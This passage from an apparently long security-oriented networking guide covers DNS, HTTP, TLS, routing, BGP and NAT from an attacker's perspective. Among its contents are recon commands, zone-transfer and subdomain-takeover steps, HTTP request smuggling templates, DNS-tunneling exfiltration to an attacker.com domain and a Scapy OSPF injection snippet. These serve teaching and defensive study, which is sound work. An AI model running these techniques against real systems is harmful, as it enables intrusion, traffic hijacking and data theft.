| QCLASS (2 bytes): 1=IN (Internet)        |
+------------------------------------------+
```

### DNS Record Types

```
A     : IPv4 address mapping
        example.com.  3600  IN  A  93.184.216.34

AAAA  : IPv6 address mapping
        example.com.  3600  IN  AAAA  2606:2800:220:1:248:1893:25c8:1946

CNAME : Canonical name (alias)
        www.example.com.  3600  IN  CNAME  example.com.

MX    : Mail exchanger
        example.com.  3600  IN  MX  10  mail.example.com.

NS    : Nameserver
        example.com.  3600  IN  NS  ns1.example.com.

TXT   : Text record (SPF, DKIM, verification, etc.)
        example.com.  300  IN  TXT  "v=spf1 include:_spf.google.com ~all"

PTR   : Reverse DNS (IP → name)
        34.216.184.93.in-addr.arpa.  IN  PTR  example.com.

SOA   : Start of Authority (zone metadata)
        example.com.  IN  SOA  ns1.example.com. admin.example.com. (
                              2024010101 ; serial
                              3600       ; refresh
                              600        ; retry
                              604800     ; expire
                              86400 )    ; minimum TTL

SRV   : Service location
        _https._tcp.example.com.  IN  SRV  10 20 443 www.example.com.

CAA   : Certification Authority Authorization (which CAs can issue certs)
        example.com.  IN  CAA  0 issue "letsencrypt.org"

DMARC : Email auth policy (TXT at _dmarc.example.com)
        _dmarc.example.com.  IN  TXT  "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com"

DKIM  : Email signing (TXT at selector._domainkey.example.com)
```

### DNS Attacks and Security

**DNS Zone Transfer (AXFR):**
```bash
# If misconfigured, dumps entire DNS zone — goldmine for recon
dig AXFR @ns1.example.com example.com
host -l example.com ns1.example.com

# Reveals: all subdomains, internal hostnames, mail servers, IP ranges
```

**DNS Enumeration:**
```bash
# Brute-force subdomains
amass enum -d example.com -brute
subfinder -d example.com
dnsx -d example.com -w wordlist.txt

# Reverse DNS on IP range
for ip in $(seq 1 255); do host 192.168.1.$ip; done | grep "domain name"

# Find all DNS records
dig example.com ANY          # ALL records (deprecated server-side often)
dig example.com TXT          # SPF, DKIM, tokens
dig _dmarc.example.com TXT   # DMARC policy
dig _acme-challenge.example.com TXT  # ACME cert validation leftovers
```

**Subdomain Takeover:**
```
Flow:
1. example.com CNAME --> target.s3.amazonaws.com
2. S3 bucket "target" gets deleted
3. CNAME still exists pointing to unclaimed bucket name
4. Attacker registers bucket named "target" at AWS
5. Attacker controls content served at example.com!

Vulnerable services:
  AWS S3, GitHub Pages, Heroku, Fastly, Shopify, 
  Azure Web Apps, Zendesk, Readme.io, Surge.sh, etc.

Detection:
  subjack -w subdomains.txt -t 100 -o results.txt
  nuclei -t ~/nuclei-templates/http/takeovers/ -l domains.txt
  
Check for NXDOMAIN on CNAME target:
  dig example.com CNAME     # Get CNAME target
  dig cname-target.service.com  # If NXDOMAIN → potentially takeable
```

**DNS Cache Poisoning (Kaminsky Attack 2008):**
```
Classic poisoning required matching 16-bit transaction ID.
Kaminsky: Instead of poisoning A record, poison NS record for a subdomain.
Send thousands of forged responses with random IDs — one will match.
Glue record in authority section poisons the resolver's cache for the whole domain.

Modern mitigations:
  - Source port randomization (adds 16 more bits of entropy)
  - DNSSEC (cryptographic signing of records)
  - 0x20 encoding (random case in query to match response)
```

**DNS Tunneling (Data Exfiltration / C2):**
```
Technique: Encode data in DNS query labels

Exfiltration:
  data.attacker.com → resolver → attacker's NS server
  
Example:
  base64_chunk1.attacker.com → A query
  base64_chunk2.attacker.com → A query
  
Attacker's NS server logs all queries → reconstructs data

Tools: dnscat2, iodine, dns2tcp

Detection:
  High query frequency to single domain
  Long subdomain labels (>50 chars)
  High entropy in subdomains
  Non-existent TLDs
  Low TTL, high unique query count
```

**DNS over HTTPS (DoH) and DNS over TLS (DoT):**
```
DoH: DNS queries inside HTTPS (port 443) → invisible to network monitors
DoT: DNS over TLS (port 853) → encrypted but visible as DNS traffic

Security implications:
  - DoH bypasses corporate DNS filtering/monitoring
  - Can be used by malware to hide C2 resolution
  - Attackers use DoH providers (Cloudflare 1.1.1.1, Google 8.8.8.8)
  
From attacker's perspective: useful for tunneling through corporate networks
```

---

## 10. HTTP/HTTPS — The Protocol You Attack Most

### HTTP/1.1

```
HTTP Request Structure:
+-----------------------------------------+
| Method SP Request-URI SP HTTP-Version CRLF|
| Header-Field: Value CRLF                |
| Header-Field: Value CRLF                |
| ...                                     |
| CRLF  (blank line = end of headers)     |
| [Message Body]                          |
+-----------------------------------------+

Example:
POST /api/login HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: application/json\r\n
Content-Length: 42\r\n
Cookie: session=abc123\r\n
User-Agent: Mozilla/5.0\r\n
\r\n
{"username":"admin","password":"secret"}

HTTP Response Structure:
+-----------------------------------------+
| HTTP-Version SP Status-Code SP Reason CRLF|
| Header-Field: Value CRLF                |
| ...                                     |
| CRLF                                    |
| [Message Body]                          |
+-----------------------------------------+

Example:
HTTP/1.1 200 OK\r\n
Content-Type: application/json\r\n
Content-Length: 25\r\n
Set-Cookie: session=xyz789; Secure; HttpOnly\r\n
\r\n
{"status":"logged in"}
```

### HTTP Methods

```
GET     : Retrieve resource (no body, idempotent, safe)
POST    : Submit data (has body, not idempotent)
PUT     : Replace resource (idempotent)
PATCH   : Partial update (not idempotent by default)
DELETE  : Remove resource (idempotent)
HEAD    : GET without body (check existence/metadata)
OPTIONS : List supported methods (CORS preflight uses this)
TRACE   : Echo request back (XST attack — largely mitigated)
CONNECT : Establish tunnel (used for HTTPS through proxy)

Security:
  OPTIONS leaks allowed methods (information disclosure)
  PUT enabled on web server → RCE (upload webshell)
  TRACE enabled → Cross-Site Tracing (XST) to steal cookies
  DELETE enabled → data destruction
```

### HTTP Status Codes (Security Relevant)

```
200 OK             : Success
201 Created        : Resource created (POST success)
204 No Content     : Success, no body (common in DELETE/PATCH)
301 Moved Perm     : Redirect (permanent)
302 Found          : Redirect (temporary) — old; 307 is correct
304 Not Modified   : Cached version valid (If-None-Match/If-Modified-Since)
307 Temp Redirect  : Preserves method on redirect
308 Perm Redirect  : Preserves method, permanent
400 Bad Request    : Malformed syntax
401 Unauthorized   : Auth required (WWW-Authenticate header present)
403 Forbidden      : Authenticated but not authorized
404 Not Found      : Resource doesn't exist
405 Method Not Allowed : Wrong HTTP method
409 Conflict       : State conflict (race condition hint)
422 Unprocessable  : Validation error
429 Too Many Reqs  : Rate limited
500 Internal Error : Server-side error (may leak stack traces)
502 Bad Gateway    : Upstream server error
503 Unavailable    : Overloaded or maintenance
504 Gateway Timeout: Upstream timeout

Bug hunting implications:
  401 vs 403: 401 = not authed, 403 = authed but denied (different user?)
  500 errors on input = potential injection point
  Different response on valid vs invalid usernames = enumeration
  Timing differences in responses = timing oracle (auth bypass)
```

### Critical HTTP Headers

**Request Headers:**
```
Host:             Virtual hosting — changing this can bypass controls, access internal vhosts
                  Host: internal.company.com → access internal service via shared IP

Authorization:    Bearer <token>, Basic <base64(user:pass)>
Cookie:           Session tokens, tracking, feature flags
Content-Type:     application/json, multipart/form-data, text/xml, application/x-www-form-urlencoded
                  Changing Content-Type can bypass WAF (JSON WAF doesn't inspect XML body)
Content-Length:   Body length — mismatch enables HTTP request smuggling
Transfer-Encoding: chunked — alternative to Content-Length — core of TE.CL/CL.TE smuggling
X-Forwarded-For:  Client IP as seen by proxy — can be spoofed if not validated
X-Real-IP:        Similar to XFF
Referer:          Page that linked here — CSRF tokens sometimes checked here
Origin:           CORS origin — server validates this for cross-origin requests
Accept:           MIME types client accepts (content negotiation — try text/html vs application/json)
User-Agent:       Browser/client identifier — often fingerprinted by WAFs
If-None-Match:    ETag-based cache validation
Range:            Request partial content: bytes=0-1023
Upgrade:          Request protocol upgrade: WebSocket, HTTP/2
Connection:       keep-alive, close, Upgrade
```

**Response Headers:**
```
Content-Type:           MUST include charset for text types (charset missing → XSS via encoding)
Content-Security-Policy: CSP — restricts scripts, frames, connections
                         Weak CSP = XSS possible: 'unsafe-inline', 'unsafe-eval', wildcards
Strict-Transport-Security: HSTS — forces HTTPS
                            Missing → SSL stripping possible
X-Frame-Options:        DENY, SAMEORIGIN — prevents clickjacking
                        Missing → clickjacking vulnerability
X-Content-Type-Options: nosniff — prevents MIME sniffing XSS
Access-Control-Allow-Origin: CORS — * or specific origin
                             ACAO: * + credentials → critical misconfiguration (cant be done)
                             ACAO: null → can be exploited with sandboxed iframe
                             ACAO: reflecting Origin header without validation → arbitrary CORS
Set-Cookie:             Session cookie — check for Secure, HttpOnly, SameSite flags
Cache-Control:          no-store, no-cache, private — prevents sensitive data caching
WWW-Authenticate:       Auth challenge type (Basic, Digest, Bearer, NTLM)
Location:               Redirect target — open redirect source
Server:                 Webserver type/version (information disclosure)
X-Powered-By:           Framework version (information disclosure)
Vary:                   Cache key fields — Vary: Origin can leak CORS config
```

### HTTP/2

```
HTTP/2 Key Differences from HTTP/1.1:
1. Binary protocol (not text-based)
2. Multiplexed streams — multiple requests over single TCP connection
3. Header compression (HPACK)
4. Server push — server can proactively send resources
5. Stream prioritization

HTTP/2 Frame Format:
+-----------------------------------------------+
|                 Length (24 bits)               |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+-------------------------------+
|R|                 Stream Identifier (31 bits)                |
+=+=============================================================+
|                   Frame Payload (variable)                   |
+---------------------------------------------------------------+

Frame Types:
  0x0 DATA         : Request/response body
  0x1 HEADERS      : Request/response headers (+ END_STREAM)
  0x2 PRIORITY     : Stream priority (deprecated in RFC 9113)
  0x3 RST_STREAM   : Cancel stream
  0x4 SETTINGS     : Connection parameters
  0x5 PUSH_PROMISE : Server push announcement
  0x6 PING         : Keepalive
  0x7 GOAWAY       : Close connection
  0x8 WINDOW_UPDATE: Flow control
  0x9 CONTINUATION : Continue HEADERS frame

Security implications:
  - HTTP/2 → HTTP/1.1 translation at proxy introduces smuggling (H2.CL, H2.TE)
  - Server push: can push sensitive resources to wrong client
  - HPACK: header compression table — information leakage (CRIME-style)
  - Stream 0: connection-level, stream N: request-level (different handling = bugs)
```

### HTTP Request Smuggling

This deserves special attention as it's a powerful and nuanced vulnerability.

```
Classic CL.TE Smuggling:
(Front-end uses Content-Length, Back-end uses Transfer-Encoding)

POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0\r\n         <- TE: this is end of chunked body
\r\n
SMUGGLED      <- CL: 13 bytes include this, back-end buffers it

Next legitimate request from victim:
GET /safe HTTP/1.1
Host: example.com

Back-end sees:
SMUGGLEDGET /safe HTTP/1.1
-> Interprets as: method=SMUGGLEDGET (malformed)
-> Or if SMUGGLED is a partial HTTP request, back-end prepends to victim's request

TE.CL Smuggling:
(Front-end uses TE, Back-end uses CL)

POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n                <- chunk size 8
SMUGGLED\r\n         <- 8 bytes
0\r\n                <- chunk end — front-end stops here
\r\n
G                    <- CL=3, back-end reads "8\r\nS" and buffers "MUG..."

H2.TE Smuggling (HTTP/2 to HTTP/1.1 downgrade):
:method POST
:path /
:authority example.com
Transfer-Encoding: chunked  <- invalid in HTTP/2 but proxy forwards it

Proxy converts to HTTP/1.1, includes TE: chunked header
Back-end sees TE, uses chunked parsing → desync

Tools: smuggler.py, turbo-intruder, Burp HTTP Request Smuggler extension
```

### HTTP/3 (QUIC)

```
HTTP/3 runs over QUIC instead of TCP:
- QUIC provides reliability and encryption at transport layer
- HTTP/3 is the application layer on top
- No TCP → no TCP-based smuggling (different attack surface)
- Stream-based: each HTTP request is a QUIC stream
- QPACK for header compression (async, not a separate connection like HTTP/2 HPACK)

Security research note: 
  HTTP/3 support in tools is still maturing
  curl --http3 https://target.com (requires special build)
  Wireshark 4.x supports QUIC/HTTP3 decryption with key log file
```

---

## 11. TLS/SSL — Encryption Architecture

### TLS Overview

TLS (Transport Layer Security) provides:
- **Confidentiality:** Symmetric encryption after handshake
- **Integrity:** MAC/AEAD (authenticated encryption)
- **Authentication:** Certificate verification (usually server, optionally client)

### TLS 1.2 Handshake

```
Client                                          Server
  |                                               |
  |---ClientHello-------------------------->|    |
  |   Version: TLS 1.2                      |    |
  |   Random: 32 bytes (timestamp + nonce)  |    |
  |   Session ID: [empty or resuming]       |    |
  |   Cipher Suites: [list of supported]    |    |
  |   Extensions: SNI, ALPN, etc.          |    |
  |                                               |
  |<--ServerHello-----------------------------|   |
  |   Version: TLS 1.2                           |
  |   Random: 32 bytes                           |
  |   Session ID: [new ID]                       |
  |   Cipher Suite: selected one                 |
  |   Extensions: [server's extensions]          |
  |                                               |
  |<--Certificate-----------------------------|   |
  |   Server's X.509 certificate chain           |
  |                                               |
  |<--ServerKeyExchange----------------------|   |
  |   (for DHE/ECDHE — ephemeral key params)     |
  |   DH params + server signature               |
  |                                               |
  |<--ServerHelloDone------------------------|   |
  |                                               |
  |---ClientKeyExchange-------------------->|    |
  |   (RSA: encrypt premaster secret with server's pub key)  |
  |   (DHE: client's DH public value)                        |
  |                                               |
  |   [Both sides derive: session keys]           |
  |   master_secret = PRF(premaster, "master secret",        |
  |                        ClientRandom + ServerRandom)       |
  |                                               |
  |---ChangeCipherSpec---------------------->|    |
  |---Finished (encrypted)----------------->|    |
  |   Verify_data = PRF(master_secret, ...)      |
  |                                               |
  |<--ChangeCipherSpec-----------------------|   |
  |<--Finished (encrypted)-------------------|   |
  |                                               |
  |<======Encrypted Application Data========>|   |
```

### TLS 1.3 Handshake (Faster)

```
Client                                          Server
  |                                               |
  |---ClientHello-------------------------->|    |
  |   Supported Versions: TLS 1.3           |    |
  |   key_share: client's ECDH public key   |    |
  |   supported_groups: X25519, P-256       |    |
  |   signature_algorithms: RSA-PSS, ECDSA  |    |
  |   psk_key_exchange_modes (if resuming)  |    |
  |                                               |
  |<--ServerHello-----------------------------|   |
  |   key_share: server's ECDH public key        |
  |   [Server derives handshake keys here]        |
  |                                               |
  |<--{EncryptedExtensions}------------------|   |
  |<--{Certificate}--------------------------|   |
  |<--{CertificateVerify}-------------------|   |
  |<--{Finished}----------------------------|   |
  |                                               |
  |---{Finished}--------------------------->|    |
  |                                               |
  |<======[Application Data]==============>|     |

TLS 1.3 improvements:
  - Only 1 RTT (vs 2 in TLS 1.2)
  - 0-RTT resumption (PSK mode — replay attack risk)
  - Removed weak algorithms: RSA key exchange, CBC, RC4, DES, SHA-1
  - Forward secrecy mandatory (ECDHE always)
  - Encrypted handshake after ServerHello
  - Certificate encrypted (metadata protection)
```

### X.509 Certificate Structure

```
TBSCertificate:
  Version:         v3 (most common)
  Serial Number:   Unique per CA (used for revocation)
  Signature Alg:   sha256WithRSAEncryption
  Issuer:          CN=DigiCert SHA2, O=DigiCert Inc, C=US
  Validity:
    Not Before:  2024-01-01
    Not After:   2025-01-01
  Subject:         CN=*.example.com, O=Example Inc, C=US
  Public Key:      RSA 2048-bit or ECDSA P-256
  Extensions:
    Subject Alternative Names (SAN): DNS:example.com, DNS:*.example.com
    Key Usage: Digital Signature, Key Encipherment
    Extended Key Usage: TLS Web Server Auth, TLS Web Client Auth
    Basic Constraints: CA:FALSE (not a CA cert)
    CRL Distribution Points: URL to check revocation
    Authority Information Access: OCSP URL + CA issuer URL
    Certificate Transparency: SCT list (Signed Certificate Timestamps)

Certificate Chain:
  Server Cert (leaf)
      issued by
  Intermediate CA
      issued by
  Root CA (trusted by OS/browser)

Chain validation:
  1. Verify each cert's signature using parent's public key
  2. Check validity period
  3. Check revocation (CRL or OCSP)
  4. Verify SANs match hostname
  5. Check key usage extensions
  6. Root must be in trust store
```

### TLS Attacks

```
SSL Stripping (Moxie Marlinspike, 2009):
  HTTPS site redirects HTTP→HTTPS
  Attacker MitM: intercepts HTTP, proxies HTTPS upstream
  User sees HTTP, attacker sees plaintext
  Mitigation: HSTS (Strict-Transport-Security header)

BEAST (Browser Exploit Against SSL/TLS, 2011):
  Affected: TLS 1.0, CBC mode
  IV for each record was last ciphertext block of previous record
  → predictable IV → block boundary oracle
  Mitigation: TLS 1.1+, RC4 (ironically), 1/n-1 split

CRIME (Compression Ratio Info-leak Made Easy, 2012):
  HTTP compression + TLS compression together
  Attacker controls part of request (cookie injection via JS)
  Measures compressed length → oracle on secret cookie value
  Mitigation: Disable TLS compression (already rare), disable HTTP compression for secrets

BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext):
  HTTP body compression only (not TLS compression)
  Same principle as CRIME but against response body
  Mitigation: Disable compression for responses containing secrets, CSRF tokens rotation

POODLE (Padding Oracle On Downgraded Legacy Encryption, 2014):
  SSL 3.0 CBC padding is not verified
  Attacker forces SSL 3.0 downgrade, then uses padding oracle
  Mitigation: Disable SSL 3.0, TLS_FALLBACK_SCSV

Heartbleed (CVE-2014-0160):
  OpenSSL TLS Heartbeat extension buffer over-read
  Server returns up to 64KB of its process memory (private keys, passwords)
  Fixed in OpenSSL 1.0.1g
  No authentication needed — pre-auth memory disclosure

FREAK (Factoring RSA Export Keys, 2015):
  Export-grade RSA (512-bit) from 1990s laws
  Attacker downgrades to export cipher, factors 512-bit key in <8 hours
  Client accepts server's export-grade key

Logjam (2015):
  Export-grade DHE (512-bit prime p)
  Same prime used by many servers → precompute discrete log once, break all
  Affects: Apache, IIS, many VPN products

DROWN (2016):
  Servers supporting SSLv2 can be used to decrypt TLS 1.2 sessions
  Special Logjam-on-SSLv2 attack
  
ROBOT (2017):
  Return of Bleichenbacher's Oracle Threat
  RSA PKCS#1 v1.5 padding oracle still present in F5, Citrix, etc.
  Allows decrypting RSA key exchanges, session key recovery

TLS 1.3 forward secrecy:
  Even if server private key compromised later, past sessions remain secure
  Because session keys derived from ephemeral ECDH keys (not static private key)
```

### Certificate Transparency (CT)

```
CT Logs:
  All publicly-trusted TLS certs must be logged in public CT logs
  Logs are append-only, Merkle tree-based
  Browsers require SCTs (Signed Certificate Timestamps) from logs
  
Security Researcher's Use:
  crt.sh: https://crt.sh/?q=%.example.com
  -> Lists ALL certificates issued for example.com and subdomains
  -> Reveals internal subdomains, test environments, acquisition targets
  
Example query:
  curl "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u
  -> Goldmine for attack surface discovery
```

### SNI (Server Name Indication)

```
Without SNI:
  Single IP can serve only ONE TLS cert
  (server must present cert before knowing which domain client wants)
  
With SNI:
  Client sends hostname in ClientHello (before encryption!)
  Server selects correct cert
  Enables virtual hosting on single IP with multiple domains
  
Security implications:
  - SNI visible in cleartext → domain-level surveillance possible even with TLS
  - ESNI/ECH (Encrypted Client Hello) — TLS 1.3 extension to encrypt SNI
  - Firewall/DPI can block/allow based on SNI without breaking encryption
  
Penetration use:
  - Different virtual hosts on same IP may have different security postures
  - curl -k --resolve target.com:443:IP https://target.com
  - Discover vhosts: gobuster vhost -u https://IP -w vhosts.txt --append-domain
```

---

## 12. Network Devices & Their Roles

### Hub (Layer 1)
```
All traffic goes to all ports (broadcast domain)
No intelligence — purely electrical signal repeater
Obsolete — replaced by switches
Security: Passive sniffing trivial — everyone on hub sees everything

Hub:
  Port1 ----\
  Port2 ------+---> Broadcasts to ALL ports
  Port3 ----/
```

### Switch (Layer 2)
```
Learns MAC→port mappings in CAM (Content Addressable Memory) table
Forwards frames only to destination port (unicast)
Separate collision domains per port

CAM Table:
  MAC Address         Port  VLAN  Age
  AA:BB:CC:DD:EE:FF   Gi0/1  1    300s
  11:22:33:44:55:66   Gi0/2  1    150s
  
MAC Flooding Attack:
  Flood switch with fake MAC addresses → CAM table full
  Switch falls back to hub behavior (floods all ports)
  Tool: macof
  Mitigation: Port Security (limit MACs per port)

Switch Port Analyzer (SPAN/Mirror):
  Copy traffic from one port/VLAN to monitoring port
  Used for IDS, packet capture
  Attackers who compromise admin access can add SPAN session
```

### Router (Layer 3)
```
Connects different networks
Strips L2 frame, examines IP header, forwards based on routing table
Rewrites L2 header at each hop (new src/dst MAC)

Routing Table:
  Destination     Gateway        Interface  Metric
  0.0.0.0/0       192.168.1.1    eth0       100   (default route)
  192.168.1.0/24  0.0.0.0        eth0       0     (directly connected)
  10.0.0.0/8      192.168.1.254  eth0       110   (via router)
  
Router vs Switch:
  Router: breaks broadcast domains, connects networks
  Switch: single broadcast domain (per VLAN), connects hosts
  Layer 3 Switch: has routing capability (common in enterprise core)
```

### Firewall
Covered in Section 16.

### Proxy Server
```
Forward Proxy:
  Client --> Forward Proxy --> Internet
  Client explicitly configured to use proxy
  Proxy makes requests on client's behalf
  Used for: caching, filtering, anonymization
  
  Security: Intercepting proxy (Burp Suite) acts as forward proxy
  
Reverse Proxy:
  Internet --> Reverse Proxy --> Backend Servers
  Client doesn't know about backend
  Used for: load balancing, SSL termination, caching, WAF
  
  Examples: Nginx, HAProxy, AWS ALB, Cloudflare
  
  Security implications:
    - WAF bypass by sending to backend directly (if IP known)
    - Host header manipulation to access different backends
    - X-Forwarded-For header to bypass IP controls
    
Transparent Proxy:
  Intercepts traffic without client configuration
  Often used by ISPs, corporate networks
  TLS inspection (SSL bumping) — uses MITM CA
  
CONNECT Method (Proxy Tunneling):
  CONNECT target.com:443 HTTP/1.1
  Host: proxy.com
  
  Proxy establishes TCP tunnel to target:443
  Client then sends TLS directly through tunnel
  Proxy can't inspect (unless doing SSL inspection)
  
  Abuse: CONNECT to internal hosts via exposed proxy (SSRF variant)
  CONNECT to smtp.attacker.com:25 → abuse proxy as email relay
```

### Load Balancer
Covered in Section 18.

---

## 13. Subnetting, CIDR, and IP Addressing

### Binary → Decimal and Back

```
IP Address: 192.168.10.50
Binary:     11000000.10101000.00001010.00110010

Decimal to Binary:
128  64  32  16   8   4   2   1
 1    1   0   0   0   0   0   0  = 192
 1    0   1   0   1   0   0   0  = 168
 0    0   0   0   1   0   1   0  = 10
 0    0   1   1   0   0   1   0  = 50
```

### CIDR Notation

CIDR (Classless Inter-Domain Routing) replaces class-based addressing.

```
Format: IP/prefix-length
Example: 192.168.1.0/24

/24 means: 24 bits for network, 8 bits for hosts
Subnet mask: 255.255.255.0

Powers of 2:
/8  = 2^24 = 16,777,214 hosts (class A)
/16 = 2^16 = 65,534 hosts (class B)
/24 = 2^8  = 254 hosts (class C)
/25 = 2^7  = 126 hosts
/26 = 2^6  = 62 hosts
/27 = 2^5  = 30 hosts
/28 = 2^4  = 14 hosts
/29 = 2^3  = 6 hosts
/30 = 2^2  = 2 hosts (point-to-point links)
/31 = 2 addresses, both usable (RFC 3021, p2p)
/32 = 1 address (host route, loopback)

Formula: usable hosts = 2^(32-prefix) - 2
(subtract network address and broadcast address)
```

### Subnet Calculation Example

```
Given: 10.20.30.0/27
Prefix: /27 = 27 network bits, 5 host bits

Subnet mask:
  11111111.11111111.11111111.11100000 = 255.255.255.224

Network address (all host bits = 0):
  10.20.30.00000000 = 10.20.30.0

Broadcast address (all host bits = 1):
  10.20.30.00011111 = 10.20.30.31

Host range: 10.20.30.1 to 10.20.30.30 (30 hosts)

Next subnet: 10.20.30.32/27
Next: 10.20.30.64/27
Next: 10.20.30.96/27 ... etc.

Supernetting (aggregation):
  192.168.0.0/24 + 192.168.1.0/24 = 192.168.0.0/23
  (summarizes 2 /24s into one /23)
```

### Recon use of CIDR

```bash
# Find all ASNs and IP ranges owned by organization
curl -s "https://api.bgpview.io/search?query_term=Facebook" | jq '.data.ipv4_prefixes[].prefix'

# Scan entire CIDR
nmap -sn 10.0.0.0/8              # ping sweep on class A (huge — careful!)
nmap -sV --open 192.168.1.0/24  # service scan on /24

# Shodan CIDR search
shodan search "net:192.168.1.0/24"  # (use real IP range)

# ASN lookup
whois -h whois.radb.net '!gAS32934'  # Get prefixes for ASN

# BGP toolkit
curl https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS32934
```

---

## 14. Routing Protocols

### Static Routing

Manually configured routes. No overhead, no convergence, no automatic failover. Used in small networks and specific cases.

### Dynamic Routing — Interior Gateway Protocols (IGP)

Used **within** an autonomous system (AS).

#### RIP (Routing Information Protocol)
```
- Distance vector: "I can reach X in N hops, via neighbor Y"
- Metric: hop count (max 15 — 16 = unreachable)
- Convergence: slow (up to several minutes)
- Updates: periodic broadcasts every 30s (RIP v1), multicast (RIP v2)
- Security: RIPv2 supports MD5 auth; RIPv1 = no auth (inject routes!)
- Largely obsolete

Attack: Inject false RIP routes (no auth in RIPv1)
  → traffic redirected through attacker
  Tools: Quagga, Scapy
```

#### OSPF (Open Shortest Path First)
```
- Link state: each router knows complete topology
- Algorithm: Dijkstra's SPF (Shortest Path First)
- Metric: Cost (based on bandwidth: cost = 10^8 / bandwidth)
- Convergence: fast (seconds)
- Area-based hierarchy: Area 0 (backbone) + other areas
- Protocol: IP protocol 89 (NOT TCP/UDP)
- Multicast: 224.0.0.5 (all OSPF routers), 224.0.0.6 (DR/BDR)

OSPF Packet Types:
  1: Hello        - Neighbor discovery, keep-alive
  2: Database Desc - Summarize link-state database
  3: LS Request   - Request specific LSAs
  4: LS Update    - Send LSAs to neighbor
  5: LS Ack       - Acknowledge LSA receipt

OSPF Security:
  - MD5 authentication available but often not configured
  - If no auth: inject LSAs to redirect traffic (Loki tool, FRRouting)
  - OSPF GRE tunnel: create hidden tunnel via injected routes
  - Reconnaissance: OSPF traffic on 224.0.0.5 reveals internal topology
  
Attack with Scapy:
  from scapy.all import *
  from scapy.contrib.ospf import *
  ospf_pkt = IP(dst="224.0.0.5")/OSPF_Hdr(type=1)/OSPF_Hello()
  send(ospf_pkt)
```

#### EIGRP (Enhanced Interior Gateway Routing Protocol)
```
- Cisco proprietary (now partially open)
- Hybrid: combines distance vector + link state
- Fast convergence (DUAL algorithm)
- Protocol 88, multicast 224.0.0.10
- Authentication: MD5 or SHA-256

Security: Often no auth in enterprise configs → route injection possible
```

### External Gateway Protocol — BGP

BGP (Border Gateway Protocol) routes traffic **between** autonomous systems (the internet backbone).

```
BGP Architecture:
          AS64512 (Your ISP)
         /                \
AS64513 ------ BGP peering ---- AS64514
(Google)                        (Cloudflare)

BGP uses TCP port 179.
eBGP: between different ASes
iBGP: within same AS (all routers need full mesh or route reflectors)

BGP Message Types:
  OPEN:         Establish session (ASN, capabilities, hold time)
  UPDATE:       Advertise/withdraw routes (path attributes)
  NOTIFICATION: Error message (closes session)
  KEEPALIVE:    Keep TCP session alive (every 60s typically)

BGP UPDATE - Route advertisement:
  Prefix:         192.0.2.0/24
  AS_PATH:        64512 64513 (path of ASes to reach prefix)
  NEXT_HOP:       203.0.113.1
  LOCAL_PREF:     100 (iBGP preference)
  MED:            50 (metric to influence inbound traffic)
  COMMUNITY:      65000:100 (route tagging)

BGP Route Selection (in order):
  1. Highest LOCAL_PREF (iBGP)
  2. Shortest AS_PATH
  3. Lowest ORIGIN (IGP < EGP < ?)
  4. Lowest MED
  5. eBGP over iBGP
  6. Lowest IGP metric to NEXT_HOP
  7. Lowest router ID (tiebreaker)
```

**BGP Hijacking:**
```
One of the most serious internet attacks.

Scenario:
  AS64512 legitimately owns 192.0.2.0/24
  AS99999 (malicious) announces 192.0.2.0/24 (more specific: /25)
  
  BGP prefers more specific routes → /25 beats /24
  Traffic for half the prefix routed to attacker
  
Real incidents:
  2008: Pakistan Telecom → YouTube blackhole
  2010: China Telecom hijacked 15% of internet routes for 18 min
  2018: Amazon Route 53 DNS hijacked (cryptocurrency theft)
  2022: Multiple incidents targeting crypto exchanges

RPKI (Resource Public Key Infrastructure) — mitigation:
  Cryptographically signs route origin (ASN is allowed to announce prefix)
  Route Origin Validation (ROV) rejects invalid announcements
  Not universally deployed — large portions of internet still vulnerable
  
AS path manipulation:
  Prepend your own AS multiple times to make path appear longer
  Influence traffic routing for load balancing or attack
```

---

## 15. NAT & PAT

### Network Address Translation

```
NAT translates IP addresses between private and public space.

Private network:         Internet
192.168.1.10 --\
192.168.1.11 ---+--[NAT Router]-- 203.0.113.1 --> Internet
192.168.1.12 --/
   (private)         (public)

Types of NAT:

Static NAT (1:1):
  One private IP ↔ one public IP
  Used for servers that must be reachable from internet
  192.168.1.10 ↔ 203.0.113.10 (always)

Dynamic NAT (many:many):
  Pool of public IPs assigned dynamically
  Multiple private IPs share pool
  Runs out if more hosts than public IPs

PAT (Port Address Translation) / NAT Overload:
  Many:1 — most common home/enterprise setup
  Uses port numbers to differentiate connections
  
  NAT Translation Table:
  +------------------+--------+------------------+--------+
  | Private IP       | Priv P | Public IP        | Pub P  |
  +------------------+--------+------------------+--------+
  | 192.168.1.10     | 52341  | 203.0.113.1      | 1024   |
  | 192.168.1.11     | 48821  | 203.0.113.1      | 1025   |
  | 192.168.1.10     | 52342  | 203.0.113.1      | 1026   |
  +------------------+--------+------------------+--------+
  
  Outbound: Replace src IP:port with public IP:mapped port
  Inbound:  Look up mapped port, replace dst IP:port with private
```

### NAT Security Implications

```
Accidental Firewall:
  Inbound connections can't reach NATted hosts without port forwarding
  → Internal hosts "hidden" behind NAT (security through obscurity)
  
NAT Traversal (required for P2P, VoIP, WebRTC):
  STUN (Session Traversal Utilities for NAT): 
    Discover public IP:port by querying STUN server
    Works for "full cone" and "restricted cone" NAT
  TURN (Traversal Using Relays around NAT):
    Relay server when direct STUN traversal fails
  ICE (Interactive Connectivity Establishment):
    Framework combining STUN + TURN + direct connection attempts
    
Security issue: SSRF can bypass NAT from inside
  If server is inside NAT: attacker's SSRF payload reaches internal RFC1918 hosts
  The NATted server can reach internal network directly (no NAT protection internally)
  
Double NAT: 
  ISP does NAT (CG-NAT: 100.64.0.0/10), then home router does NAT
  Breaks certain protocols, complicates port forwarding
  Common with IPv4 address exhaustion
  
CGNAT (Carrier-Grade NAT):
  100.64.0.0/10 — shared between ISP customers
  Multiple customers share one public IP
  Complicates attribution (logs show single IP for many users)
  DMCA takedowns become complicated
```

---

## 16. Firewalls, WAFs, and IDS/IPS

### Firewall Types

#### Packet Filter (Stateless, Layer 3/4)
```
Rules based on: Src IP, Dst IP, Protocol, Src Port, Dst Port
No state — each packet evaluated independently

Rule table (iptables example):
